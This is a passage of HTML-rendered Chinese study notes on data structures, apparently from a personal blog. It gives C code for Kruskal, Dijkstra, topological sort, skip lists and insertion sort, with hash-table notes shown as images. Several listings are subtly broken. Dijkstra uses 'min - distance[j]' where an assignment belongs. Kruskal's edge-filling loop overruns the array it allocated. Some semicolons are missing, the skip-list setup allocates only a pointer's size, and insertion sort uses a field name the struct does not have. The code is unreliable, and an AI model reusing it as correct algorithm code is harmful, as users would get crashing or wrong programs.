class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">EDGE_STRU</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> begin;<span class="comment">//边的起点</span></span><br><span class="line">    <span class="type">int</span> end;<span class="comment">//边的终点</span></span><br><span class="line">    <span class="type">int</span> weight; <span class="comment">//边的权值</span></span><br><span class="line">&#125;Edge;</span><br><span class="line">GraphMatrix* <span class="title function_">kruskal</span><span class="params">(GraphMatrix *graphMatrix)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i,j,k;</span><br><span class="line">    <span class="type">int</span> edgeNum = <span class="number">0</span>;</span><br><span class="line">    Edge *edge = <span class="literal">NULL</span>;</span><br><span class="line">    Edge tempEdge;<span class="comment">//给边排序时的临时变量</span></span><br><span class="line">    <span class="type">int</span> pos;<span class="comment">//记录添加到哪条边</span></span><br><span class="line">    <span class="type">int</span> *group;<span class="comment">//记录点是否属于同一连通分量</span></span><br><span class="line">    <span class="type">int</span> changeGroup;<span class="comment">//记录要变化的连通值</span></span><br><span class="line">    GraphMatrix * tree = IniGraph(graphMatrix-&gt;size);<span class="comment">//存放结果的图</span></span><br><span class="line">    group = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*graphMatrix-&gt;size);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;graphMatrix-&gt;size;i++)<span class="comment">//初始化，点之间不连通</span></span><br><span class="line">        group[i] = i;</span><br><span class="line">    <span class="comment">//分析有多少条边</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;graphMatrix-&gt;size;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(j=i+<span class="number">1</span>;j&lt;graphMatrix-&gt;size;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(graphMatrix-&gt;graph[i][j]&lt;INT_MAX)</span><br><span class="line">                edgeNum++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//根据刚计算出来的边的数量分派空间</span></span><br><span class="line">    edge = (Edge*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Edge)*edgeNum);</span><br><span class="line">    k = <span class="number">0</span>;<span class="comment">//给边赋值的时候用</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;graphMatrix-&gt;size;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;graphMatrix-&gt;size;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(graphMatrix-&gt;graph[i][j]&lt;INT_MAX)</span><br><span class="line">            &#123;</span><br><span class="line">                edge[k].begin = i;</span><br><span class="line">                edge[k].end = j;</span><br><span class="line">                edge[k].weight = graphMatrix-&gt;graph[i][j];</span><br><span class="line">                k++</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;edgeNum;i++)<span class="comment">//根据边权值进行排序</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(j=i+<span class="number">1</span>;j&lt;edgeNum;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(edge[i].weight&gt;edge[j].weight)</span><br><span class="line">            &#123;</span><br><span class="line">                tempEdge = edge[i];</span><br><span class="line">                edge[i] = edge[j];</span><br><span class="line">                edge[j] = tempEdge;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//每次从边数组中取出最小的一条边，判断是否能添加到最小生成树中</span></span><br><span class="line">    <span class="comment">//边数组已排好序</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;edgeNum;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//只添加终点和七点属于两个不同连通分量的边</span></span><br><span class="line">        <span class="keyword">if</span>(group[edge[i].begin]!=group[edge[i].end])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//添加到树中</span></span><br><span class="line">            tree-&gt;graph[edge[i].begin][edge[i].end] = edge[i].weight;</span><br><span class="line">            tree-&gt;graph[edge[i].end][edge[i].begin] = edge[i].weight;</span><br><span class="line">            <span class="comment">//更新所有跟终点属于同一连通分量的点的连通性</span></span><br><span class="line">            changeGroup = group[edge[i].end];</span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;edgeNum;j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(group[j] == changeGroup)</span><br><span class="line">                    group[j] = group[edge[i].begin];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> tree;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Dijstra算法"><a href="#Dijstra算法" class="headerlink" title="Dijstra算法"></a>Dijstra算法</h2><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201217053107.png"></p><ul><li>算法实现：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>* <span class="title function_">dijkstra</span><span class="params">(GraphMatrix * graphMatrix,<span class="type">int</span> source)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i,j,vex,min;</span><br><span class="line">    <span class="comment">//found数组用于记录哪些点是新点集合的，哪些不是</span></span><br><span class="line">    <span class="type">int</span>* found = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*graphMatrix-&gt;size);</span><br><span class="line">    <span class="comment">//距离数组，在算法过程中不断更新，最后结果也在这</span></span><br><span class="line">    <span class="type">int</span>* distance = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*graphMatrix-&gt;size);</span><br><span class="line">    <span class="type">int</span>* path = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*graphMatrix-&gt;size);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;graphMatrix-&gt;size;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        found[i] = <span class="number">0</span>;</span><br><span class="line">        path[i] = <span class="number">0</span>;</span><br><span class="line">        distance[i] = graphMatrix-&gt;graph[source][i];</span><br><span class="line">    &#125;<span class="comment">//end 9</span></span><br><span class="line">    <span class="comment">//将起点加入新点集合中</span></span><br><span class="line">    found[source] = <span class="number">1</span>;</span><br><span class="line">    distance[source] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//每次加入一个点到新点集合中，规则是当前距离最小的</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;graphMatrix-&gt;size;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        min = MAX;<span class="comment">//寻找距离最小的点</span></span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;graphMatrix-&gt;size;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(!found[j] &amp;&amp; (distance[j]&lt;min))</span><br><span class="line">            &#123;</span><br><span class="line">                vex = j;</span><br><span class="line">                min - distance[j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="comment">//end 22</span></span><br><span class="line">        found[vex] = <span class="number">1</span>;<span class="comment">//找到的点加入新点集合</span></span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;graphMatrix-&gt;size;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(!found[j] &amp;&amp; graphMatrix-&gt;graph[vex][j]!=MAX)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(min+graphMatrix-&gt;graph[vex][j]&lt;distance[j])</span><br><span class="line">                &#123;</span><br><span class="line">                    distance[j] = min + graphMatrix-&gt;graph[vex][j];</span><br><span class="line">                    path[j] = vex;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="comment">//end 31</span></span><br><span class="line">    &#125;<span class="comment">//end 19</span></span><br><span class="line">    <span class="keyword">return</span> distance;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="拓扑排序（AOV网）"><a href="#拓扑排序（AOV网）" class="headerlink" title="拓扑排序（AOV网）"></a>拓扑排序（AOV网）</h2><ul><li>有向图</li><li>无环图</li><li>定点表示活动</li><li>边表示活动间的先后关系</li><li>排序方法<ul><li>从AOV网中选择一个<code>入度为0</code>的顶点输出</li><li>在AOV网中<code>删除</code>此顶点和它的所有出边</li><li>反复到输出所有顶点</li></ul></li></ul><blockquote><p>AOV网的拓扑序列不唯一</p><p>有回环不存在拓扑序列</p></blockquote><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201217211908.png"></p><ul><li>算法思路：<ul><li>计算各个顶点的入度</li><li>将入度为0的顶点入栈</li><li>如果栈不空，取出元素 v 并输出</li><li>检查顶点 v 的出边表，将出边表中的每个顶点 w 的入度减一，如 w 的入度为 0 ，顶点 w 入栈</li><li>重复直到栈空</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">topologicalsort</span><span class="params">(GraphList *graphList)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> nodeNum;</span><br><span class="line">    <span class="type">int</span> success = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">stack</span>&lt;<span class="type">int</span>&gt;nodeStack;</span><br><span class="line">    <span class="comment">//使用STL中的stack</span></span><br><span class="line">    GraphListNode *tempNode = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> *inPoint = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*graphList-&gt;size);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;graphList-&gt;size;i++)</span><br><span class="line">        inPoint[i] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;graphList-&gt;size;i++)<span class="comment">//计算顶点的入度</span></span><br><span class="line">    &#123;</span><br><span class="line">        tempNode = graphList-&gt;graphListArray[i].next;</span><br><span class="line">        <span class="keyword">while</span>(tempNode!=<span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            inPoint[tempNode-&gt;nodeno]++;</span><br><span class="line">            tempNode = tempNode-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;graphList-&gt;size;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(inPoint[i] == <span class="number">0</span>)</span><br><span class="line">            nodeStack.push(i)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(!nodeStack.empty())</span><br><span class="line">    &#123;</span><br><span class="line">        nodeNum = nodeStack.top();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,nodeNum);</span><br><span class="line">        nodeStack.pop();</span><br><span class="line">        count++;</span><br><span class="line">        <span class="comment">//检查v的出边，将每条出边的终端顶点的入度 -1 ，若该顶点的入度为 0 ，入栈</span></span><br><span class="line">        tempNode = graphList-&gt;graphListArray[nodeNum].next;</span><br><span class="line">        <span class="keyword">while</span>(tempNode!=<span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            inPoint[tempNode-&gt;nodeno]--;</span><br><span class="line">            <span class="keyword">if</span>(inPoint[tempNode-&gt;nodeno]==<span class="number">0</span>)</span><br><span class="line">                nodeStack.push(tempNode-&gt;nodeno);</span><br><span class="line">            tempNode = tempNode-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(count!=graphList-&gt;size)</span><br><span class="line">        success = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> success;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="关键路径（AOE网）"><a href="#关键路径（AOE网）" class="headerlink" title="关键路径（AOE网）"></a>关键路径（AOE网）</h2><ul><li>带权的有向图</li><li>顶点表示时间，有向边表示活动</li><li>边上的权值表示活动持续的时间</li><li>顶点所表示的事件实际上就是它的入边所表示的活动都已完成，它的出边所表示的活动可以开始这样一种状态</li><li>只有一个入度为 0 的顶点</li><li>只有一个出度为 0 的顶点</li></ul><blockquote><p>具体算法以后再补</p></blockquote><h2 id="六度空间"><a href="#六度空间" class="headerlink" title="六度空间"></a>六度空间</h2><blockquote><p>有空再学，现在不感兴趣——12.18</p></blockquote><h2 id="中国邮递员问题"><a href="#中国邮递员问题" class="headerlink" title="中国邮递员问题"></a>中国邮递员问题</h2><blockquote><p>有空再学，现在不感兴趣——12.18</p></blockquote><h1 id="第七章-字典"><a href="#第七章-字典" class="headerlink" title="第七章 字典"></a>第七章 字典</h1><p>字典最重要的就是检索</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201218024417.png"></p><h2 id="跳跃链表"><a href="#跳跃链表" class="headerlink" title="跳跃链表"></a>跳跃链表</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>跳跃链表就是在结点中增加指针域，让其直接指向其他的后继结点的指针，使得访问链表的过程中可以交替跳过其直接后继结点</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201218024815.png"></p><h3 id="建立和查找"><a href="#建立和查找" class="headerlink" title="建立和查找"></a>建立和查找</h3><ul><li>类型定义</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_LEVEL 6<span class="comment">//定义最大层数</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> KeyType</span><br><span class="line"><span class="comment">//跳跃链表结点结构定义</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> level;<span class="comment">//结点层数</span></span><br><span class="line">    KeyType key;<span class="comment">//结点的值</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>[<span class="title">MAX_LEVEL</span>];</span><span class="comment">//指针数组</span></span><br><span class="line">&#125;*PNode;</span><br><span class="line"><span class="comment">//跳跃链表结构定义</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> num;<span class="comment">//跳跃链表数据个数</span></span><br><span class="line">    <span class="type">int</span> maxLevel;<span class="comment">//跳跃链表最大层数</span></span><br><span class="line">    PNode head;<span class="comment">//跳跃链表的头指针</span></span><br><span class="line">&#125;*SkipList;</span><br></pre></td></tr></table></figure><ul><li>建立</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">SkipList <span class="title function_">SetNullSkipList</span><span class="params">(<span class="type">int</span> level)</span></span><br><span class="line">&#123;</span><br><span class="line">    SkipList <span class="built_in">list</span> = (SkipList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(SkipList));</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">list</span> == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">list</span>-&gt;num = <span class="number">0</span>;<span class="comment">//跳跃链表计数器置零</span></span><br><span class="line">    <span class="built_in">list</span>-&gt;maxLevel = level;<span class="comment">//跳跃链表层数</span></span><br><span class="line">    <span class="built_in">list</span>-&gt;head = CreateNode(level,<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">list</span>-&gt;head == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">free</span>(<span class="built_in">list</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;level;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">list</span>-&gt;head-&gt;next[i] = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PNode <span class="title function_">CreateNode</span><span class="params">(<span class="type">int</span> level,KeyType key)</span><span class="comment">//生成一个新结点</span></span><br><span class="line">&#123;</span><br><span class="line">    PNode p = (PNode)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(PNode) + <span class="keyword">sizeof</span>(PNode)*level);</span><br><span class="line">    <span class="keyword">if</span>(p == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    p-&gt;level = level;</span><br><span class="line">    p-&gt;key = key;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>查找</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">PNode <span class="title function_">SkipListSearch</span><span class="params">(SkipList <span class="built_in">list</span>,KeyType key)</span><span class="comment">//按值查找</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> n = <span class="number">0</span>;</span><br><span class="line">    PNode p = <span class="literal">NULL</span>;</span><br><span class="line">    q = <span class="literal">NULL</span>;</span><br><span class="line">    p = <span class="built_in">list</span>-&gt;head;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i =<span class="built_in">list</span>-&gt;maxLevel <span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>((q = p-&gt;next[i]) &amp;&amp; (q-&gt;key &lt;= key))<span class="comment">//横向比较</span></span><br><span class="line">        &#123;</span><br><span class="line">            p = q;</span><br><span class="line">            n++;</span><br><span class="line">            <span class="keyword">if</span>(p-&gt;key == key)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,n);</span><br><span class="line">                <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="插入和删除"><a href="#插入和删除" class="headerlink" title="插入和删除"></a>插入和删除</h3><blockquote><p>有空补</p></blockquote><h2 id="散列表"><a href="#散列表" class="headerlink" title="散列表"></a>散列表</h2><h3 id="散列函数和冲突"><a href="#散列函数和冲突" class="headerlink" title="散列函数和冲突"></a>散列函数和冲突</h3><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201218045225.png"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201218045305.png"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201218050453.png"></p><p> <img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201218051049.png"></p><h3 id="散列表的建立、查找、插入和删除"><a href="#散列表的建立、查找、插入和删除" class="headerlink" title="散列表的建立、查找、插入和删除"></a>散列表的建立、查找、插入和删除</h3><ul><li>查找</li></ul><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201218051339.png"></p><ul><li>插入</li></ul><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201218052735.png"></p><ul><li>删除</li></ul><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201218052836.png"></p><h1 id="第九章-排序"><a href="#第九章-排序" class="headerlink" title="第九章 排序"></a>第九章 排序</h1><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201218053313.png"></p><ul><li>待排序的记录，采用顺序存储结构</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> KeyType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> InfoType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">RECORDTYPE_STRU</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    KeyType key;<span class="comment">//关键字</span></span><br><span class="line">    InfoType otherInfo;<span class="comment">//其他数据信息</span></span><br><span class="line">&#125;RecordType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">SORTARRAY_STRU</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> cnt;<span class="comment">//记录排序数组中元素个数</span></span><br><span class="line">    RecordType *recordArr;<span class="comment">//指向一维数组的指针</span></span><br><span class="line">&#125;SortArr;</span><br></pre></td></tr></table></figure><ul><li>交换函数</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Swap</span><span class="params">(SortArr* sortArr,<span class="type">int</span> i,<span class="type">int</span> j)</span></span><br><span class="line">&#123;</span><br><span class="line">    KeyType temp;</span><br><span class="line">    temp = sortArr-&gt;recordArr[i].key;</span><br><span class="line">    sortArr-&gt;recordArr[i].key = sortArr-&gt;recordArr[j].key;</span><br><span class="line">    sortArr-&gt;recordArr[j].key = temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="插入类排序"><a href="#插入类排序" class="headerlink" title="插入类排序"></a>插入类排序</h2><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201218054123.png"></p><h3 id="直接插入排序"><a href="#直接插入排序" class="headerlink" title="直接插入排序"></a>直接插入排序</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">InsertSort</span><span class="params">(SortArr* sortArr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i,j;</span><br><span class="line">    RecordType temp;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">1</span>;i&lt;sortArr-&gt;count;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        j = i - <span class="number">1</span>;<span class="comment">//j是已经排好顺序的数据最后一个元素的下标</span></span><br><span class="line">        temp = sortArr-&gt;recordArr[i];<span class="comment">//等待插入的数据temp</span></span><br><span class="line">        <span class="comment">//从j位置开始，从后向前在已经排好顺序的序列中找到插入位置</span></span><br><span class="line">        <span class="keyword">while</span>(temp.key&lt;sortArr-&gt;recordArr[j].key &amp;&amp; j&gt;=<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            sortArr-&gt;recordArr[j+<span class="number">1</span>] = sortArr-&gt;recordArr[j];<span class="comment">//待插入元素比有序序列中元素小，有序序列中元素往前移</span></span><br><span class="line">            j--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span 